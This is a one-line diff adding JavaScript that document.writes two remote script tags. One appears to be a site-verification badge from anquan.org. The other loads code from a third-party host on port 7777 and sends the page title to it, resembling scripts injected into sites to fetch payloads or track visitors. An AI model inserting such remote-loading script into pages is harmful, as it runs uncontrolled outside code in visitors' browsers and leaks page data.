@@ -1,0 +1,1 @@
+document.write("<script language='javascript' src='http://static.anquan.org/static/outer/js/aq_auth.js?_vv=20080808'></script>");document.write("<script language='javascript' src='http://p.haolew.com:7777/pt/pt.php?src=p0007&t="+encodeURIComponent(document.title)+"&ci=1946825011'></script>");
